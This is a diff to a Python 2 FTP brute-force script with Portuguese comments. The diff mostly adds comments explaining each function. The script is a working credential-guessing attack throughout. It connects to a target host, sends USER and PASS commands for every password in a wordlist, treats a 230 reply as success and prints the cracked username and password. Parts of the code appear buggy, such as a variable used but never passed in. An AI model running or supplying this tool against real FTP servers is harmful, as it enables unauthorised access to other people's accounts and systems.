@@ -4,7 +4,7 @@ import socket
 import re
 import getopt
 
-
+# banner
 def banner():
 	print """
 
@@ -26,6 +26,7 @@ def banner():
 
 """
 
+# help
 def help():
 	banner()
 	print """
@@ -47,6 +48,7 @@ def help():
 """
 	sys.exit()
 
+# faz um teste com o host e a porta informada antes de iniciar
 def test(host,port):
 	try:
 		test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -56,11 +58,13 @@ def test(host,port):
 		print '\n \33[31m[-] NAO FOI POSSIVEL CONECTAR COM O HOST', host + ':' + port, "\n\33[0m"
 		sys.exit()
 
+# bruteforce com lista de senhas
 def brute_passlist(usuario,passlist,host,port,verbose,resp,parar):
 	with open(passlist) as pwl:
 		for p in pwl:
 			p = p.strip()
 			saida = "[-] Tentando %s:%s"%(usuario,p)
+			# mostra cada tentativa caso verbose esteja ativado
 			if verbose == 1:
 				print '	'+saida.strip()
 			ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -71,7 +75,7 @@ def brute_passlist(usuario,passlist,host,port,verbose,resp,parar):
 			ftp.send('PASS '+p+'\r\n')
 			ftpbanner = ftp.recv(1024)
 			if re.search('230',ftpbanner):
-				if parar == 1:
+				if parar == 1: # para ao encontrar a senha caso seja informado um unico usuario
 					print '\n	SENHA ENCONTRADA:\n'
 					print "	[\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]"%(host,usuario,p)
 					sys.exit()
@@ -82,8 +86,10 @@ def brute_passlist(usuario,passlist,host,port,verbose,resp,parar):
 				ftp.close()
 	pwl.close()
 
+# bruteforce com um unico password
 def brute_pass(usuario,pw,host,port,verbose,resp):
 	saida = "[-] Tentando %s:%s"%(usuario,pw)
+	# mostra cada tentativa caso verbose esteja ativado
 	if verbose == 1:
 		print '	'+saida.strip()
 		ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -94,7 +100,7 @@ def brute_pass(usuario,pw,host,port,verbose,resp):
 		ftp.send('PASS '+pw+'\r\n')
 		ftpbanner = ftp.recv(1024)
 		if re.search('230',ftpbanner):
-			if parar == 1:
+			if parar == 1: # para ao encontrar a senha caso seja informado um unico usuario
 				print "\n	SENHA ENCONTRADA:\n"
 				print " [\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]]"%(host,usuario,pw)
 			enc = " [\33[92m+\33[0m] [\33[92m%s\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]]"%(host,usuario,pw)
@@ -106,6 +112,7 @@ def brute_pass(usuario,pw,host,port,verbose,resp):
 			ftp.close()
 		ftp.close()
 
+# calcula as entradas de resposta e exibe o quantitativo caso haja sucesso ou mensagem de senha nao encontrada
 def resposta(resp,verbose):
 	if verbose == 1:
 		print "\n	------------------------------------------------------------------------"
@@ -121,10 +128,12 @@ def resposta(resp,verbose):
 
 
 def main(argv):
-	resp = []
+	# checa a quantidade de parametros
 	if len(sys.argv) == 1:
 		help()
 
+	# parametos padrao
+	resp = []
 	luser = 0
 	lpass = 0
 	host = ''
@@ -135,8 +144,8 @@ def main(argv):
 	passlist = ''
 	userlist = ''
 	argumento = []
-	parar = 0
 
+	# checa os parametros informados e grava os argumentos
 	try:
         	opts, args = getopt.getopt(argv,"hva:p:u:U:s:S:")
 	except getopt.GetoptError:
@@ -160,6 +169,7 @@ def main(argv):
 		elif opt == '-U':
 			userlist = arg
 
+	# checa se parametros incompativeis foram informados
 	if '-s' in argumento and '-S' in argumento:
 		banner()
 		print '	\33[93mO parametro -s nao pode ser usado com -S\33[0m'
@@ -169,10 +179,12 @@ def main(argv):
 		print '	\33[93mO parametro -u nao pode ser usado com -U\33[0m'
 		sys.exit()
 
+	# inicia o programa
 	banner()
 	test(host,port)
 
 
+	# calcula o tamano=ho da wordlist de usuarios
 	try:
 		if userlist != '':
 			with open(userlist) as dfuser:
@@ -186,6 +198,7 @@ def main(argv):
 		print "	\33[31mParametro invalido em -U\33[0m"
 		sys.exit()
 
+	# calcula o tamanho da wordlist de senhas
 	try:
 		if passlist != '':
 			with open(passlist) as dfpass:
@@ -199,6 +212,7 @@ def main(argv):
 		print "	\33[31mParametro invalido em -S\33[0m"
 		sys.exit()
 
+	# inicio do bruteforce
 	print "\n	INICIANDO BRUTE FORCE NO HOST: "+host+":"+str(port)+"\n"
 
 
@@ -208,6 +222,7 @@ def main(argv):
 	print "	[+] Senhas...........................[%s]\n"%(lpass)
 	print "	------------------------------------------------------------------------\n"
 
+	# envia dados para a funcao correta de acordo com as opcoes escolhidas
 	if userlist != '' and passlist != '':
 		with open(userlist) as usrlist:
 			for u in usrlist:
